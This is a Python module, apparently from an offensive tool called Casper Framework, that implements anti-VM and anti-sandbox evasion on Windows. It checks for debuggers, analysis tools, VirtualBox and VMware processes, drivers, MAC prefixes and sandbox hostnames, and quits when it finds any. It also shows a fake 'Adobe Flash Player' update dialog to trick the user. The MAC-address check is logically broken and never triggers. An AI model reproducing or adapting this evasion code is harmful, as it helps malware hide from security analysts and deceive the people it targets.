"""
Part of Casper Framework
"""
from imports import *

wmi = wmi.WMI()

def disks():
	'''
	Lowest amount of disk space accepted before executing
	'''
	DriveSize = float(2147483648)

	try:
		for disk in wmi.Win32_LogicalDisk(DriveType=3):
			if (disk.Size > DriveSize):
				pass
			else:
				sys.exit()
	except Exception as e:
		pass				
	return True

def memory():
	'''
	Lowest amount of memory accepted before executing
	'''
	MemSize = float(2147483648)
	
	try:
		for memory in wmi.Win32_ComputerSystem():
			if (memory.TotalPhysicalMemory > MemSize):
				pass
			else:
				sys.exit()
	except Exception as e:
		pass		
	return True
	
def processes():
	'''
	Iterate through all the running processes
	'''
	ProcessList = ["ollydbg.exe","ProcessHacker.exe","vmsrvc.exe","fiddler.exe","tcpview.exe","vmware.exe","vbox.exe","vmvss.exe","vmscsi.exe","vmhgfs.exe","vboxservice.exe","vmxnet.exe","vmx_svga.exe","df5serv.exe","vmmemctl.exe","autoruns.exe","autorunsc.exe","vmusbmouse.exe","filemon.exe","procmon.exe","vmtools.exe","regmon.exe","vboxtray.exe","procexp.exe","vmrawdsk.exe","idaq.exe","idaq64.exe","ImmunityDebugger.exe","Wireshark.exe","dumpcap.exe","HookExplorer.exe","ImportREC.exe","PETools.exe","LordPE.exe","SysInspector.exe","proc_analyzer.exe","sysAnalyzer.exe","sniff_hit.exe","windbg.exe","joeboxcontrol.exe","joeboxserver.exe","vmtoolsd.exe","vmwaretray.exe","vmwareuser.exe","vmusrvc.exe","prl_cc.exe","prl_tools.exe","xenservice.exe"]	

	try:
		for process in wmi.Win32_Process():
			for processName in ProcessList:
				if (process.Name.lower().find(processName) == 0):
					sys.exit()
				else:
					pass
	except Exception as e:
		pass
	return True

def files():
	'''
	Iterate through all files
	'''
	KnownFiles	= ["c:\\windows\\Sysnative\\drivers\\VBoxMouse.sys","c:\\windows\\Sysnative\\drivers\\VBoxGuest.sys","c:\\windows\\Sysnative\\drivers\\VBoxSF.sys","c:\\windows\\Sysnative\\drivers\\VBoxVideo.sys","c:\\windows\\Sysnative\\Drivers\\VmGuestLibJava.dll","c:\\windows\\Sysnative\\drivers\\vmhgfs.sys","c:\\windows\\Sysnative\\Drivers\\vmGuestLib.dll","c:\\windows\\Sysnative\\Drivers\\vmmousever.dll","c:\\windows\\Sysnative\\Drivers\\VMToolsHook.dll","c:\\windows\\Sysnative\\Drivers\\vmtray.dll","c:\\windows\\Sysnative\\Drivers\\vm3dver.dll","c:\\windows\\Sysnative\\Drivers\\vmdum.dll","c:\\windows\\Sysnative\\Drivers\\vm3dgl.dll","c:\\windows\\Sysnative\\vboxdisp.dll","c:\\windows\\Sysnative\\vboxhook.dll","c:\\windows\\Sysnative\\vboxmrxnp.dll","c:\\windows\\Sysnative\\vboxogl.dll","c:\\windows\\Sysnative\\vboxoglarrayspu.dll","c:\\windows\\Sysnative\\vboxoglcrutil.dll","c:\\windows\\Sysnative\\vboxoglerrorspu.dll","c:\\windows\\Sysnative\\vboxoglfeedbackspu.dll","c:\\windows\\Sysnative\\vboxoglpackspu.dll","c:\\windows\\Sysnative\\vboxoglpassthroughspu.dll","c:\\windows\\Sysnative\\vboxservice.exe","c:\\windows\\Sysnative\\vboxtray.exe","c:\\windows\\Sysnative\\VBoxControl.exe","c:\\windows\\Sysnative\\drivers\\vmusbmouse.sys","c:\\windows\\Sysnative\\drivers\\vmx_svga.sys","c:\\windows\\Sysnative\\drivers\\vmxnet.sys","c:\\windows\\Sysnative\\drivers\\vmmouse.sys","c:\\windows\\Sysnative\\drivers\\vmscsi.sys"]

	for file in KnownFiles:
		if (os.path.isfile(file)):
			sys.exit()
		else:
			pass
	return True	
	
def interfaces():
	'''
	Iterate through max 20 network interfaces and
	match it against our known vm addresses
	'''
	MaxIndex = 20

	for index in range(MaxIndex):
		for interface in wmi.Win32_NetworkAdapterConfiguration(Index=index):
			if ("08:00:27" not in str(interface.MACAddress)):
				pass
			elif ("00:05:69" not in str(interface.MACAddress)):
				pass
			elif ("00:0C:29" not in str(interface.MACAddress)):
				pass
			elif ("00:1C:14" not in str(interface.MACAddress)):
				pass
			else:
				sys.exit()
	return True

def debugger():
	'''
	Look for debugger
	'''
	isDebuggerPresent = windll.kernel32.IsDebuggerPresent()
	
	if (isDebuggerPresent):
		sys.exit()
	else:
		pass
	return True

def userinput():
	'''
	Prompt for user interaction
	'''
	MessageBoxA = windll.user32.MessageBoxA(0,"We just updated your Adobe Flash Player!","Adobe Update",0x0|0x40)
		
	if (MessageBoxA == 1):
		pass
	else:
		sys.exit()
	return True	

def hostname():
	'''
	Iterate through all hostnames
	'''
	hostnames = ["sandbox","vmware","qbox","qemu","vbox","virtualbox","xen"]

	for host in hostnames:
		if (socket.gethostname().lower() == host.lower()):
			sys.exit()
		else:
			pass
	return True

def antivm(value):
	'''
	Run all tests and exit if we detect something fishy
	'''
	if (value == 1):
		logging.debug('[casper] antivm > looking for known processes')
		if processes() == True:
			logging.debug('[casper] antivm > done')
			pass
		else:
			sys.exit()

		logging.debug('[casper] antivm > looking for known memory')
		if memory() == True:
			logging.debug('[casper] antivm > done')
			pass
		else:
			sys.exit()
			
		logging.debug('[casper] antivm > looking for known disk')
		if disks() == True:
			logging.debug('[casper] antivm > done')
			pass
		else:
			sys.exit()
		
		logging.debug('[casper] antivm > looking for known debugger')
		if debugger() == True:
			logging.debug('[casper] antivm > done')
			pass
		else:
			sys.exit()

		logging.debug('[casper] antivm > looking for known hostnames')
		if hostname() == True:
			logging.debug('[casper] antivm > done')
			pass
		else:
			sys.exit()

		logging.debug('[casper] antivm > looking for known files')
		if files() == True:
			logging.debug('[casper] antivm > done')
			pass
		else:
			sys.exit()

		logging.debug('[casper] antivm > looking for known userinput')
		if userinput() == True:
			logging.debug('[casper] antivm > done')
			pass
		else:
			sys.exit()
	else:
		pass
	return True
